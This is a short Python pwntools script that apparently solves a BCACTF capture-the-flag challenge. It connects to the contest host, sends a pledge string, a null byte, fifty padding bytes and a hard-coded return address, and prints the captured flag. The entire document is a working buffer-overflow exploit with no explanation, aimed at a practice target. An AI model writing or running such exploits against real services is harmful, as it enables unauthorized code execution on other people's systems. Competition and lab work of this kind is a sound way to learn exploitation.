from pwn import *
host = "bin.bcactf.com"
port = 49156
payload = 'i pledge to not cheat'+'\x00'+'A'*50 + '\x16\x12\x40\x00\x00\x00'
s = remote(host,port)
(s.recvuntil(b">"))
s.sendline(payload)
print(s.recvuntil("bcactf{")[-7:]+s.recvuntil("}"))
